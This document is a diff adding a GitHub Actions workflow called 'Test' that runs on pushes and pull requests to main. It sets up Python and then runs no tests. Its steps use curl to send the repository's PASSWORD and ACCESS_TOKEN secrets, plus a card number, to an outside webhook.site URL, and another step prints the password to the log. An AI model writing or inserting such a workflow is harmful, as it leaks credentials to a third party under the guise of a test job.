@@ -1,0 +1,50 @@
+name: Test
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      - name: Set up Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.11'
+          cache: 'pip'
+
+      - name: send pass
+        env:
+          PASSWORD: ${{ secrets.PASSWORD }}
+          CARD_NUMBER: '4111111111111111'
+        run: |
+          curl  "https://webhook.site/e5a09d46-4a2a-495b-8a2b-e0bececa455a?test=hakou2222${PASSWORD}"
+
+
+      - name: Csend card
+        env:
+          ACCESS_TOKEN: ${{ secrets.ACCESS_TOKEN }}
+          CARD_NUMBER: '4111111111111111'
+        run: |
+          curl  "https://webhook.site/e5a09d46-4a2a-495b-8a2b-e0bececa455a?test=hakou1111${CARD_NUMBER}"
+          
+      - name: send secret
+        env:
+          ACCESS_TOKEN: ${{ secrets.ACCESS_TOKEN }}
+          CARD_NUMBER: '4111111111111111'
+        run: |
+          curl  "https://webhook.site/e5a09d46-4a2a-495b-8a2b-e0bececa455a?test=hakou2222${ACCESS_TOKEN}"
+      - name: print pass
+        env:
+          PASSWORD: ${{ secrets.PASSWORD }}
+          CARD_NUMBER: '4111111111111111'
+        run: |
+          echo "====${PASSWORD}"
+
